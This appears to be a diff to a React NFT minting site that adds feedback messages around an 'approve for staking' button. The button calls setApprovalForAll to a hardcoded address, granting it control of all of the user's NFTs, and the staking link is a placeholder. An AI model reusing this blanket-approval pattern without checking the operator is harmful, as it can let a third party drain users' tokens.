@@ -95,6 +95,7 @@ function App() {
   const data = useSelector((state) => state.data);
   const [claimingNft, setClaimingNft] = useState(false);
   const [feedback, setFeedback] = useState(`Click buy to mint your NFT.`);
+  const [approvefeedback, setAproveFeedback] = useState(`If You Want To Stake Your NFT Click Approve`);
   const [mintAmount, setMintAmount] = useState(1);
   const [CONFIG, SET_CONFIG] = useState({
     CONTRACT_ADDRESS: "",
@@ -115,17 +116,27 @@ function App() {
     SHOW_BACKGROUND: false,
   });
   
-    const approveNFTs = () => {
-
+  const approveNFTs = () => {
+    setAproveFeedback(`Approving your ${CONFIG.NFT_NAME}...`);
     blockchain.smartContract.methods
     .setApprovalForAll("0x4D8C6bFEA02A8739D587F7BB9B76D5BB581eB9c6",true)
     .send({
       to: CONFIG.CONTRACT_ADDRESS,
       from: blockchain.account,
     })
+    .once("error", (err) => {
+      console.log(err);
+      setAproveFeedback("Sorry, something went wrong please try again later.");
+    })
+    .then((receipt) => {
+      console.log(receipt);
+      setAproveFeedback(
+        `WOW, the ${CONFIG.NFT_NAME} is ready for staking! go <a href='https://google.com'>HERE</a> to stake it.`
+      );
+      dispatch(fetchData(blockchain.account));
+    });
 
   }
-
 
   const claimNFTs = () => {
     let cost = CONFIG.WEI_COST;
@@ -475,7 +486,7 @@ function App() {
                         color: "var(--accent-text)",
                       }}
                     >
-                      If You Want To Stake Your NFT Click Approve
+                      {approvefeedback}
                     </s.TextDescription>
           <s.SpacerSmall />
           <StyledButton
@@ -486,7 +497,7 @@ function App() {
                           getData();
                         }}
                       >
-                       {claimingNft ? "CONNECT" : "APPROVE"}
+                       APPROVE
                       </StyledButton>
         </s.Container>
         <s.SpacerMedium />
